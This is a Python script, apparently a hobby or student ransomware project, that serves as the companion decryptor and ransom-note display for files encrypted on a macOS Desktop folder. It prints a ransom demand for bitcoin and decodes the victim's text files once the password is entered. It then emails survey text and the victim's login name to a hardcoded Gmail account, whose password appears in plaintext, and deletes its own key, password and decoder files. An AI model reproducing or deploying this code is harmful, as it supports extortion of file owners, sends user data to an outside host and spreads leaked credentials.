#!/usr/bin/python
# -*- coding: utf8 -*-
import os
import argparse
import time
import smtplib

TGREEN = '\033[32m'  # Green Text
TRED = '\033[31m'  # Red Text
TYELLOW = '\033[33m'  # Red Text
ENDC = '\033[m'  # reset to the defaults
# add arg
parser = argparse.ArgumentParser()
parser.add_argument('-i', action="store_true", help='information about us')  # arg for information
parser.add_argument('-d', action="store_true", help='decrypt your files')  # arg for decrypt
args = parser.parse_args()


# function for decode
def decode(mot):
    mot = mot.replace('=', '')  # replace all '=' by nothing
    car_list = [bin(base64.index(car)) for car in mot]  # replace all element by binary
    list = [element[2:] for element in car_list]  # remove the 0b of element
    list = [element.zfill(6) for element in list]  # add '0' if the element len is not 6
    car_string = ''.join(list)  # change list in string
    car_string = car_string[:(len(car_string) - len(car_string) % 8)]  # Delete many ...
    car_bytes = int(car_string, base=2).to_bytes(len(car_string) // 8, 'big')
    return car_bytes.decode()  # return the decoded string
    pass


def email(textsend):
    gmail_user = 'pythononhtyp@gmail.com'  # id connection for email used
    gmail_password = 'testpython'  # password for email used

    sent_from = gmail_user
    to = ['pythononhtyp@gmail.com']

    email_text = 'Satisfaction survey from ' + os.getlogin() + '\n\n' + textsend  # text send

    # connection on gmail serveur
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)  # login for gmail
        server.sendmail(sent_from, to, email_text)  # send mail
        server.close()  # close connection

    except:
        print(TRED + 'you are not connected sorry' + ENDC)
        pass


# delete function
def delete():
    # delete decodeur.py
    try:
        os.remove("/Users/" + os.getlogin() + "/Desktop/dossier/decodeur.py")
    except:
        pass
    # delete readme.txt
    try:
        os.remove("/Users/" + os.getlogin() + "/Desktop/dossier/readme.txt")
    except:
        pass
    # delete .pass
    try:
        os.remove("/Users/" + os.getlogin() + "/Desktop/dossier/.pass")
    except:
        pass
    # delete .key
    try:
        os.remove("/Users/" + os.getlogin() + "/Desktop/dossier/.key")
    except:
        pass


def survey():
    print(TGREEN + 'Satisfaction survey')
    choice_survey = input('Would you like to respond to some questions ? [y/n] : ' + ENDC)
    while choice_survey.lower() not in ('y', 'n', 'yes', 'no'):
        print(TRED + 'Our program only understand [y/n] :' + ENDC)
        choice_survey = input(TGREEN + 'Would you like to respond to some questions ? [y/n] : ' + ENDC)
    if choice_survey in ('y', 'yes'):
        print(TGREEN + 'This is nice from you' + ENDC)
    elif choice_survey in ('n', 'no'):
        print(TGREEN + 'Too bad you are taking it like this' + ENDC)
        delete()
        exit()
    info = input(TGREEN + 'Did you have a great experience with our program ? [y/n] : ' + ENDC)
    while info.lower() not in ('y', 'n', 'yes', 'no'):
        print(TRED + 'Our program only understand y or n ' + ENDC)
        info = input(TGREEN + 'Did you have a great experience with our program ? [y/n] : ' + ENDC)
    if info in ('y', 'yes'):
        print(TGREEN + 'You are realy nice' + ENDC)
    elif info in ('n', 'no'):
        print(TGREEN + 'Tell us where you think we can improve ourselves' + ENDC)
        text_satisfaction = input()
        email(text_satisfaction)  # run email function with user's text
    print(TGREEN + 'Tanks you for respond have a nice day' + ENDC)
    delete()


# if user use -d
if args.d:
    # Print the locked padlock
    print(
        '\n                         :+shhhys+-\n                      :yMMMMMMMMMMMNy:\n                     `hMMMMNhsooshNMMMMh`\n                    `mMMMN+`      `+NMMMm`\n                    sMMMM-          -MMMMo\n                    hMMMm            NMMMh\n                 `..dMMMm............NMMMh..`\n                ' + TYELLOW + ' dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMNmmMMMMMMMMMMMMd\n                 dMMMMMMMMMM+   `oMMMMMMMMMMd\n                 dMMMMMMMMMN`    `MMMMMMMMMMd\n                 dMMMMMMMMMMm`  `mMMMMMMMMMMd\n                 dMMMMMMMMMMN    NMMMMMMMMMMd\n                 dMMMMMMMMMMd````dMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMh\n                 .sdmmmmmmmmmmmmmmmmmmmmmmds`' + ENDC + '\n\n                  ' + TRED + 'YOUR FILES ARE NOW CRYPTED\n             PLEASE ENTER THE PASSWORD DOWN BELLOW\n' + ENDC)
    # Open hide file key, take the key and close the file
    try:
        key_file = open("/Users/" + os.getlogin() + "/Desktop/dossier/.key", "r")
        base64 = str(key_file.read())
        key_file.close()
    except:
        print(TRED + 'no key for you sorry' + ENDC)
        delete()
        exit()
    # Search the realpassword in the hide file save
    try:
        file_save = open('/Users/' + os.getlogin() + '/Desktop/dossier/.pass', 'r')
        realpass = str(file_save.read())
        file_save.close()
    except:
        print(TRED + 'no password for you sorry' + ENDC)
        delete()
        exit()
    password = input('password for decrypte your txt files: ')  # password request
    if password == realpass:  # Verification of the password
        for element in os.listdir("/Users/" + os.getlogin() + "/Desktop/dossier/"):
            if element.endswith('.txt') and element != 'readme.txt':
                file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'r')
                newtext = decode(str(file.read()))
                file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'w')
                file.write(newtext)
                file.close()
            else:
                pass
        # Print the unlocked padlock
        print(
            '\n                          :+shhhys+-\n                        :yMMMMMMMMMMMNy:\n                      `hMMMMNhsooshNMMMMh`\n                     `mMMMN+`      `+NMMMm`\n                                    -MMMMo\n                                      NMMMh\n                 `....................NMMMh..`\n                ' + TYELLOW + ' dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMNmmMMMMMMMMMMMMd\n                 dMMMMMMMMMM+   `oMMMMMMMMMMd\n                 dMMMMMMMMMN`    `MMMMMMMMMMd\n                 dMMMMMMMMMMm`  `mMMMMMMMMMMd\n                 dMMMMMMMMMMN    NMMMMMMMMMMd\n                 dMMMMMMMMMMd````dMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMh\n                 .sdmmmmmmmmmmmmmmmmmmmmmmds`' + ENDC + '\n\n     ' + TGREEN + 'YOUR FILES ARE NOW UNCRYPTED, THANK YOU FOR THE BITCOINS\n  PLEASE GAVE US STARS ON TRUSTPILOT  (434 REVIEWS ' + TYELLOW + '★ ☆ ☆ ☆ ☆' + TGREEN + ' )!\n' + ENDC)
        survey()  # run survey function
    else:
        print(TRED + 'fail wrong password' + ENDC)
# if user use -i
if args.i:
    # Print information with time
    print(
        TGREEN + 80 * "=" + "\n           __    __       ___       ______  __  ___  _______  _______  \n          |  |  |  |     /   \     /      ||  |/  / |   ____||       \ \n          |  |__|  |    /  ^  \   |  ,---- |  `  /  |  |__   |  .--.  |\n          |   __   |   /  /_\  \  |  |     |    <   |   __|  |  |  |  |\n          |  |  |  |  /  _____  \ |  `----.|  .  \  |  |____ |  `--`  |\n          |__|  |__| /__/     \__\ \______||__|\__\ |_______||_______/ \n\n" + 80 * "=" + "\n\n • You just got hacked by the H4CK3R™ \n\n • All your files are been encrypted\n\n • For decrypt your files you must send \n   100$ in btc to the address below\n" + ENDC + 80 * "=")
    time.sleep(3)
    print(
        "\n   ▄▄▄▄▄▄▄ ▄ ▄ ▄▄▄▄   ▄▄ ▄▄▄▄▄▄▄\n   █ ▄▄▄ █ ▄██▀▀▀  █ █▄▀ █ ▄▄▄ █\n   █ ███ █ █▀▀▄█ █▀▄██ ▀ █ ███ █\n   █▄▄▄▄▄█ ▄ █▀▄▀▄▀█ █▀▄ █▄▄▄▄▄█              " + TGREEN + "Please send 0.001 BTC" + ENDC + "\n   ▄▄▄▄  ▄ ▄ █▄█▄ ███▄ ▀▄  ▄▄▄ ▄              " + TGREEN + "To this BTC adress by" + ENDC + "\n    ▀▀▄██▄▀ ▄█▄██▀▀▄▄▄ ▀█▀▀▀▄▄█▀\n   █▀ ▄█▄▄█▄██ ▄ ▄ █▄ ▄▀▄ ▀▄█▄▀▀\n   █▄▄ █▄▄█ ▄▄█▀▄▀▀█▄▄█▄██  ▄ ▄█\n   ▀ ▀▀█ ▄█▀██▀▄ █▀▄▄█ ▀█▀█ █▄█▀              " + TGREEN + "If you don't know how" + ENDC + "\n   ▄▀▀█ ▄▄█ ██  ▄█▄ ▄▄ █ ▀▀   █               " + TGREEN + "to get bitcoin? Go to" + ENDC + "\n    ▄▀▀██▄▄█ █▀ ██▀▀██▀█▄▄████▀█              " + TGREEN + "coinbase.com and signup" + ENDC + "\n   ▄▄▄▄▄▄▄ ▀▄▄   ▄ ██ ▄█ ▄ █ █ ▀\n   █ ▄▄▄ █  ▄▄█▀▀▀▄ ▄█ █▄▄▄█ ▄▄ \n   █ ███ █ █▀█▀▄▀▄▀▀ ▀▄ ▀▄█ ▀▀ █\n   █▄▄▄▄▄█ █▀█▄▀▀  █  ▄█ █▄▄▀▄█\n                      \n\n" + 80 * "=")
